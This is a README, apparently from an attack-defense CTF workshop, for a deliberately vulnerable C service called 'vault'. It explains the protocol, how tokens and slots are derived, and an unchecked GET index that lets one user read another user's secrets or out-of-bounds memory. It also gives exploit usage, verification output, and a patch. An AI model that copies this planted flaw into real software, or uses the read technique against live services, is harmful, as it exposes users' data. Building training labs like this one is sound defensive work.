# vault — pwn 漏洞服務(C daemon, port 10000)

A/D CTF 攻防工坊的「上限難度」服務。故意埋一個 **OOB read(越界 / 跨 slot 讀取)** 漏洞,
完全照 [`CONTRACTS.md §2.3`](../../CONTRACTS.md) 的 line-based TCP 協定。

> ⚠️ 此服務故意有漏洞,僅供隔離網段內攻防鍛造,切勿部署到公開環境。

---

## 1. 協定(line-based TCP,每行 `\n` 結尾,ASCII)

每連線一個 session,session 狀態為「是否已 AUTH」與「目前綁定的 slot(`my_slot`)」。

| 指令 | 回應 | 說明 |
|---|---|---|
| `REGISTER <user>` | `OK <token>` | 配一個 slot 給 user,回 token。**冪等**:同 user 回同 slot、同 token |
| `AUTH <user> <token>` | `OK` / `ERR` | 驗證 token;成功後 session 綁定該 user 的 slot |
| `SET <secret>` | `OK` / `ERR` | 需 AUTH。把 secret 存進 `secrets[my_slot]` |
| `GET <idx>` | `SECRET <data>` / `ERR` | 需 AUTH。回傳 `secrets[idx]`。**漏洞:idx 不檢查邊界** |
| `PING` | `PONG` | check 用 |

未 AUTH 就 `SET` / `GET`,或指令格式錯誤,一律回 `ERR`。

---

## 2. slot / token 方案(checker 可重現性)

兩者都是 **user 字串的決定性函數**,所以:
- server 重啟後同 user 仍得到相同 slot 與 token(冪等 REGISTER)。
- checker 由 `flag_id` 導出 user 後,可自行算出 token 與預期 slot,無需另存狀態。

### token 導出

```
token = lower_hex16( FNV1a_64(seed=0x9e3779b97f4a7c15, user) )
```

即帶固定金鑰 `0x9e3779b97f4a7c15` 的 FNV-1a 64 位元雜湊,取低 64 位輸出成 16 個 16 進位字元。

### slot 配發

```
base  = FNV1a_64(seed=0xcbf29ce484222325, user) mod N      # N = 256
slot  = base;  若 base 已被「別的 user」佔用 → 線性探測 (base+1, base+2, ...) mod N
```

對同一 user 永遠落到同一 slot(冪等)。`my_slot` 即 checker 的 `public` / 攻擊方的 `attack_data`。

> 與 §2.3 對應:checker `put` 回傳 `public = my_slot`(int 字串);
> `get` 由 flag_id 重建同帳號 AUTH 後 `GET <own_slot>` 比對;
> exploit `GET <victim_slot>` 偷 flag。

### Python 參考實作(checker / exploit 端可直接用)

```python
def fnv1a(seed, s):
    h = seed
    for c in s.encode():
        h ^= c; h = (h * 0x100000001b3) & 0xFFFFFFFFFFFFFFFF
    return h

def token_of(user): return "%016x" % (fnv1a(0x9e3779b97f4a7c15, user) & 0xFFFFFFFFFFFFFFFF)
def slot_of(user):  return fnv1a(0xcbf29ce484222325, user) % 256   # 無碰撞時即 server 配的 slot
```

> 註:`slot_of` 在無碰撞時等於 server 實際配發的 slot。碰撞時 server 會線性探測,
> 但 checker 流程取 slot 的權威來源仍是 `REGISTER` 回應(public)——checker 不必自算 slot,
> 只需用 server 回的 public 即可;上式供驗證/離線預測之用。

---

## 3. 漏洞位置

檔案 [`vault.c`](./vault.c),`GET` 指令處理:

- **第 253 行**:`int idx = atoi(arg);` — idx 直接來自使用者輸入。
- **第 262 行**:`snprintf(out, sizeof(out), "SECRET %s\n", secrets[idx]);` — **未檢查 `0 <= idx < N` 就索引 `secrets[idx]`**。

後果:任何已 AUTH 的 session 可 `GET <別人的 slot>` 讀到他人 secret(跨 slot read);
極端 idx(負數 / 超大值)更會越界讀到陣列外記憶體(OOB read)。漏洞為 **確定性、不 crash**
(只是讀出該位址當下的位元組,daemon 不會崩潰)。

---

## 4. 編譯 / 執行 / 攻擊

### 編譯

```bash
make            # 用 gcc -O0 編譯出 ./vault(-O0 讓漏洞行為穩定可重複)
```

### 執行 daemon

```bash
./vault         # 監聽 0.0.0.0:10000;每連線 fork 一子行程
# 全域 secrets 陣列放共享記憶體(mmap MAP_SHARED),故跨連線可見彼此的 SET
```

### Docker

```bash
docker build -t vault .
docker run --rm -p 10000:10000 vault    # 低權限 vault 使用者執行,EXPOSE 10000
```

### 攻擊(exploit.py)

```bash
# 用法:./exploit.py <host> <port> <victim_slot> [atk_user]
python3 exploit.py 127.0.0.1 10000 <victim_slot>
```

exploit 流程:自建攻擊者帳號 `REGISTER` → `AUTH` 取得合法 session → `GET <victim_slot>`
跨 slot 讀出受害者 secret,印到 stdout。

---

## 5. 驗證紀錄(真實輸出)

`make` 編譯:

```
cc -O0 -g -Wall -Wextra -std=c11 -fno-stack-protector -o vault vault.c
```

起 daemon 後跑完整情境(userA SET → userB 偷讀 + 自讀 + 越界 + PING):

```
PING -> PONG
A REGISTER -> OK 7d00939366a37cd9
A AUTH -> OK
A SET -> OK
B REGISTER -> OK 7d00909366a377c0
B AUTH -> OK
computed slotA=41 slotB=16
token check userA: True userB: True
B GET 41 (A's slot) -> SECRET FLAG_AAA_secret_of_A     # ← 跨 slot OOB read 偷到 A 的 secret
B GET 16 (own slot) -> SECRET                          # ← 自己 slot(未 SET,為空)
B GET 99999 (oob) ->                                   # ← 越界 idx,讀到空,daemon 不 crash
```

`exploit.py` 對 victim slot 41:

```
$ python3 ./exploit.py 127.0.0.1 10000 41
FLAG_AAA_secret_of_A
=== daemon still alive? ===
yes, port still open
```

Python 端用相同演算法重算的 slot/token 與 server 完全一致(`token check ... True`),
證明 checker 可由 flag_id 決定性重現帳號。

---

## 6. 安全堵法(§2.3,defense 用)

在 `GET` 處理(`vault.c` 第 253–262 行)加邊界檢查,**只允許讀自己的 slot**:

```c
int idx = atoi(arg);
if (idx != my_slot) {            /* 或至少 0 <= idx < N */
    send_str(fd, "ERR\n");
    continue;
}
char out[SECRET_LEN + 16];
snprintf(out, sizeof(out), "SECRET %s\n", secrets[idx]);
```

要點:
- 拒絕負數、超大值、整數溢位(`atoi` 對溢位回的怪值也會被 `idx != my_slot` 擋掉)。
- 保留合法存取:使用者 `GET <own_slot>` 仍正常,checker `get` 不受影響。
